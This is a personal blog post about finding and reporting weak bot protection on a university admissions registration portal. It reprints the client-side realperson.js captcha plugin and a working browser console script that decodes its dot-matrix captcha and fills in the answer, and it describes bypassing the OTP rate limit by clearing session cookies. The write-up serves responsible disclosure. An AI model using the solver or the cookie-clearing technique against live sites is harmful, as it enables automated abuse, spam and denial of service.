---
title: "finding minor vulnerabilities on IITK B.Cyber registration portal without any prior cybersec inclination  (ironic)"
description: "non-existent captcha (basically a client-side gen/validate plugin), how i found a way to exploit it, & reported it"
link: "/blogs/iitk_cyberugdam"
date: "jun 2026"
---

#### What is IITK B. Cyber programme?

IITK has started a hackathon-based entry for their new B.Cyber programme that is supposedly for students who failed / did not participate in the JEE Main Examination. It was supposed to be portfolio shortlisting (though it had jeem %ile based shortlisting as well, of course).

Me, after failing all my competitive exams, tried to shoot my shot and found that the captcha was basically a client-side jquery-plugin that generated a character matrix and validated it client-side as well, ironically, this was the login portal for their Bachelors in *Cyber Security* programme.

I reported it all to <pingala@iitk.ac.in> as well as the scripts i made to by-pass otp limits. This blog documents how I found it with no prior cybersec background.

Link for the x thread is [here](https://x.com/i_u_sh/status/2070457857074688395?s=20)

## Video

<video controls width="100%">
  <source src="/assets/iitk_ugdam/otp_vuln.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

*Demonstration of the OTP bypass vulnerability.*

I decided to shoot my shot and apply for B. Cyber programme (knowing I would just be shortlisted based of my jeem %ile considering how bad it was and the general qualifications for these IIT BS programmes being JEE Mains qualified). After filling the registration form, the first thing I noticed was re-generating captcha was instant. Opened up the network tab and expectedly it was fully client-side jQuery plugin which generated a character-matrix client-side and validated it client-side as well. I found where the plugin was located, and it was of course just an algorithmic captcha generator called realperson.js.

they removed the references of this plugin and use a Image-based captcha now but they did not delete it yet, still publicly visible at [plugins/form-validator/jquery.realperson.js](https://pingala.iitk.ac.in/CYBER_UGADM/resources/theme/AdminLTEE/plugins/form-validator/jquery.realperson.js)

```js
# @collapsed
/* http://keith-wood.name/realPerson.html
   Real Person Form Submission for jQuery v2.0.1.
   Written by Keith Wood (kwood{at}iinet.com.au) June 2009.
   Available under the MIT (http://keith-wood.name/licence.html) license.
   Please attribute the author if you use it. */

(function($) { // Hide scope, no $ conflict

        var pluginName = 'realperson';

        var ALPHABETIC = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        var ALPHANUMERIC = ALPHABETIC + '0123456789';
        var DOTS = [
                ['   *   ', '  * *  ', '  * *  ', ' *   * ', ' ***** ', '*     *', '*     *'],
                ['****** ', '*     *', '*     *', '****** ', '*     *', '*     *', '****** '],
                [' ***** ', '*     *', '*      ', '*      ', '*      ', '*     *', ' ***** '],
                ['****** ', '*     *', '*     *', '*     *', '*     *', '*     *', '****** '],
                ['*******', '*      ', '*      ', '****   ', '*      ', '*      ', '*******'],
                ['*******', '*      ', '*      ', '****   ', '*      ', '*      ', '*      '],
                [' ***** ', '*     *', '*      ', '*      ', '*   ***', '*     *', ' ***** '],
                ['*     *', '*     *', '*     *', '*******', '*     *', '*     *', '*     *'],
                ['*******', '   *   ', '   *   ', '   *   ', '   *   ', '   *   ', '*******'],
                ['      *', '      *', '      *', '      *', '      *', '*     *', ' ***** '],
                ['*     *', '*   ** ', '* **   ', '**     ', '* **   ', '*   ** ', '*     *'],
                ['*      ', '*      ', '*      ', '*      ', '*      ', '*      ', '*******'],
                ['*     *', '**   **', '* * * *', '*  *  *', '*     *', '*     *', '*     *'],
                ['*     *', '**    *', '* *   *', '*  *  *', '*   * *', '*    **', '*     *'],
                [' ***** ', '*     *', '*     *', '*     *', '*     *', '*     *', ' ***** '],
                ['****** ', '*     *', '*     *', '****** ', '*      ', '*      ', '*      '],
                [' ***** ', '*     *', '*     *', '*     *', '*   * *', '*    * ', ' **** *'],
                ['****** ', '*     *', '*     *', '****** ', '*   *  ', '*    * ', '*     *'],
                [' ***** ', '*     *', '*      ', ' ***** ', '      *', '*     *', ' ***** '],
                ['*******', '   *   ', '   *   ', '   *   ', '   *   ', '   *   ', '   *   '],
                ['*     *', '*     *', '*     *', '*     *', '*     *', '*     *', ' ***** '],
                ['*     *', '*     *', ' *   * ', ' *   * ', '  * *  ', '  * *  ', '   *   '],
                ['*     *', '*     *', '*     *', '*  *  *', '* * * *', '**   **', '*     *'],
                ['*     *', ' *   * ', '  * *  ', '   *   ', '  * *  ', ' *   * ', '*     *'],
                ['*     *', ' *   * ', '  * *  ', '   *   ', '   *   ', '   *   ', '   *   '],
                ['*******', '     * ', '    *  ', '   *   ', '  *    ', ' *     ', '*******'],
                ['  ***  ', ' *   * ', '*   * *', '*  *  *', '* *   *', ' *   * ', '  ***  '],
                ['   *   ', '  **   ', ' * *   ', '   *   ', '   *   ', '   *   ', '*******'],
                [' ***** ', '*     *', '      *', '     * ', '   **  ', ' **    ', '*******'],
                [' ***** ', '*     *', '      *', '    ** ', '      *', '*     *', ' ***** '],
                ['    *  ', '   **  ', '  * *  ', ' *  *  ', '*******', '    *  ', '    *  '],
                ['*******', '*      ', '****** ', '      *', '      *', '*     *', ' ***** '],
                ['  **** ', ' *     ', '*      ', '****** ', '*     *', '*     *', ' ***** '],
                ['*******', '     * ', '    *  ', '   *   ', '  *    ', ' *     ', '*      '],
                [' ***** ', '*     *', '*     *', ' ***** ', '*     *', '*     *', ' ***** '],
                [' ***** ', '*     *', '*     *', ' ******', '      *', '     * ', ' ****  ']];

        /** Create the real person plugin.
                <p>Displays a challenge to confirm that the viewer is a real person.</p>
                <p>Expects HTML like:</p>
                <pre>&lt;input...></pre>
                <p>Provide inline configuration like:</p>
                <pre>&lt;input data-realperson="name: 'value'">...></pre>
                @module RealPerson
                @augments JQPlugin
                @example $(selector).realperson()
 $(selector).realperson({length: 200, toggle: false}) */
        $.JQPlugin.createPlugin({

                /** The name of the plugin. */
                name: pluginName,

                /** The set of alphabetic characters. */
                alphabetic: ALPHABETIC,
                /** The set of alphabetic and numeric characters. */
                alphanumeric: ALPHANUMERIC,
                /** The set dots that make up each character. */
                defaultDots: DOTS,

                /** More/less change callback.
                        Triggered when the more/less button is clicked.
                        @callback changeCallback
                        @param expanding {boolean} True if expanding the text, false if collapsing. */

                /** Default settings for the plugin.
                        @property [length=6] {number} Number of characters to use.
                        @property [regenerate='Click to change'] {string} Instruction text to regenerate.
                        @property [hashName='{n}Hash'] {string} Name of the hash value field to compare with,
                                                use {n} to substitute with the original field name.
                        @property [dot='*'] {string} The character to use for the dot patterns.
                        @property [dots=defaultDots] {string[][]} The dot patterns per letter in chars.
                        @property [chars=alphabetic] {string} The characters allowed. */
                defaultOptions: {
                        length: 6,
                        regenerate: 'Click to change',
                        hashName: '{n}Hash',
                        dot: '*',
                        dots: DOTS,
                        chars: ALPHABETIC
                },

                _getters: ['getHash'],

                _challengeClass: pluginName + '-challenge',
                _disabledClass: pluginName + '-disabled',
                _hashClass: pluginName + '-hash',
                _regenerateClass: pluginName + '-regen',
                _textClass: pluginName + '-text',

                _optionsChanged: function(elem, inst, options) {
                        $.extend(inst.options, options);
                        var text = '';
                        for (var i = 0; i < inst.options.length; i++) {
                                text += inst.options.chars.charAt(Math.floor(Math.random() * inst.options.chars.length));
                        }
                        inst.hash = hash(text + salt);
                        var self = this;
                        elem.closest('form').off('.' + inst.name).
                                on('submit.' + inst.name, function() {
                                        var name = inst.options.hashName.replace(/\{n\}/, elem.attr('name'));
                                        var form = $(this);
                                        form.find('input[name="' + name + '"]').remove();
                                        form.append('<input type="hidden" class="' + self._hashClass + '" name="' + name +
                                                '" value="' + hash(text + salt) + '">');
                                        setTimeout(function() {
                                                form.find('input[name="' + name + '"]').remove();
                                        }, 0);
                                });
                        elem.prevAll('.' + this._challengeClass + ',.' + this._hashClass).remove().end().
                                before(this._generateHTML(inst, text)).
                                prevAll('div.' + this._challengeClass).click(function() {
                                        if (!$(this).hasClass(self._disabledClass)) {
                                                elem.realperson('option', {});
                                        }
                                });
                },

                /* Enable the plugin functionality for a control.
                   @param elem {element} The control to affect. */
                enable: function(elem) {
                        elem = $(elem);
                        if (!elem.hasClass(this._getMarker())) {
                                return;
                        }
                        elem.removeClass(this._disabledClass).prop('disabled', false).
                                prevAll('.' + this._challengeClass).removeClass(this._disabledClass);
                },

                /* Disable the plugin functionality for a control.
                   @param elem {element} The control to affect. */
                disable: function(elem) {
                        elem = $(elem);
                        if (!elem.hasClass(this._getMarker())) {
                                return;
                        }
                        elem.addClass(this._disabledClass).prop('disabled', true).
                                prevAll('.' + this._challengeClass).addClass(this._disabledClass);
                },

                /* Retrieve the hash value.
                   @param elem {Element} The control with the hash.
                   @return {number} The hash value. */
                getHash: function(elem) {
                        var inst = this._getInst(elem);
                        return inst ? inst.hash : 0;
                },

                /* Generate the additional content for this control.
                   @param inst {object} The current instance settings.
                   @param text {string} The text to display.
                   @return {string} The additional content. */
                _generateHTML: function(inst, text) {
                        var html = '<div class="' + this._challengeClass + '">' +
                                '<div class="' + this._textClass + '">';
                        for (var i = 0; i < inst.options.dots[0].length; i++) {
                                for (var j = 0; j < text.length; j++) {
                                        html += inst.options.dots[inst.options.chars.indexOf(text.charAt(j))][i].
                                                replace(/ /g, '&#160;').replace(/\*/g, inst.options.dot) +
                                                '&#160;&#160;';
                                }
                                html += '<br>';
                        }
                        html += '</div><div class="' + this._regenerateClass + '">' +
                                inst.options.regenerate + '</div></div>';
                        return html;
                },

                _preDestroy: function(elem, inst) {
                        elem.closest('form').off('.' + inst.name);
                        elem.prevAll('.' + this._challengeClass + ',.' + this._hashClass).remove();
                }
        });

        /* Load salt value and clear. */
        var salt = $.salt || '#salt';
        delete $.salt;
        $(function() {
                var saltElem = $(salt);
                if (saltElem.length) {
                        salt = saltElem.text();
                        saltElem.remove();
                }
                if (salt === '#salt') {
                        salt = '';
                }
        });

        /* Compute a hash value for the given text.
           @param value {string} The text to hash.
           @return {number} The corresponding hash value. */
        function hash(value) {
                var hash = 5381;
                for (var i = 0; i < value.length; i++) {
                        hash = ((hash << 5) + hash) + value.charCodeAt(i);
                }
                return hash;
        }

})(jQuery);
```

Now all it took was one prompt, pasted whatever was visible in the DOM, the plugin and asked claude sonnet to make a simple console snippet to decode this captcha, and No Suprises, it did.

collapsed by default, click on ' + '

```js
# @collapsed
function decode() {
  const container = document.querySelector('.realperson-text');
  const rawRows = container.innerHTML.split('<br>');
  const rows = rawRows.filter(r => r.trim()).map(r => r.replace(/&#160;/g, ' ').replace(/&nbsp;/g, ' '));
  const DOTS = [
    ['   *   ','  * *  ','  * *  ',' *   * ',' ***** ','*     *','*     *'],
    ['****** ','*     *','*     *','****** ','*     *','*     *','****** '],
    [' ***** ','*     *','*      ','*      ','*      ','*     *',' ***** '],
    ['****** ','*     *','*     *','*     *','*     *','*     *','****** '],
    ['*******','*      ','*      ','****   ','*      ','*      ','*******'],
    ['*******','*      ','*      ','****   ','*      ','*      ','*      '],
    [' ***** ','*     *','*      ','*      ','*   ***','*     *',' ***** '],
    ['*     *','*     *','*     *','*******','*     *','*     *','*     *'],
    ['*******','   *   ','   *   ','   *   ','   *   ','   *   ','*******'],
    ['      *','      *','      *','      *','      *','*     *',' ***** '],
    ['*     *','*   ** ','* **   ','**     ','* **   ','*   ** ','*     *'],
    ['*      ','*      ','*      ','*      ','*      ','*      ','*******'],
    ['*     *','**   **','* * * *','*  *  *','*     *','*     *','*     *'],
    ['*     *','**    *','* *   *','*  *  *','*   * *','*    **','*     *'],
    [' ***** ','*     *','*     *','*     *','*     *','*     *',' ***** '],
    ['****** ','*     *','*     *','****** ','*      ','*      ','*      '],
    [' ***** ','*     *','*     *','*     *','*   * *','*    * ',' **** *'],
    ['****** ','*     *','*     *','****** ','*   *  ','*    * ','*     *'],
    [' ***** ','*     *','*      ',' ***** ','      *','*     *',' ***** '],
    ['*******','   *   ','   *   ','   *   ','   *   ','   *   ','   *   '],
    ['*     *','*     *','*     *','*     *','*     *','*     *',' ***** '],
    ['*     *','*     *',' *   * ',' *   * ','  * *  ','  * *  ','   *   '],
    ['*     *','*     *','*     *','*  *  *','* * * *','**   **','*     *'],
    ['*     *',' *   * ','  * *  ','   *   ','  * *  ',' *   * ','*     *'],
    ['*     *',' *   * ','  * *  ','   *   ','   *   ','   *   ','   *   '],
    ['*******','     * ','    *  ','   *   ','  *    ',' *     ','*******']
  ];
  const CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const charCount = Math.round(rows[0].length / 9);
  let decoded = '';
  for (let j = 0; j < charCount; j++) {
    let pattern = rows.slice(0, 7).map(r => r.substring(j * 9, j * 9 + 7));
    for (let d = 0; d < DOTS.length; d++) {
      if (DOTS[d].join('') === pattern.join('')) { decoded += CHARS[d]; break; }
    }
  }
  document.querySelector('input.is-realperson').value = decoded;
  console.log(decoded);
}
decode();
```

And ofcourse, i got otp rate-limited. But, to my suprise, this ratelimit was a simlpe JSESSIONID created for my browser and stored as a cookie context. lmao.

i made a simple python script with playwright to create multiple sessions, bypassing the JSESSIONID cookie by clearing context for each session. Basically, now i could just spam create registration sessions till they either their server goes OOM holding all these otps in memory or their email server starts flagging. Ofcourse, me being a responsible man, i did not do any of those and responsibly report them to <pingala@iitk.ac.in> , would have applied for B.Cyber if i would have got my acknowledgement mail atleast. (they fixed the captcha with an image-based captcha, and server-side verification as i suggested them in the email)

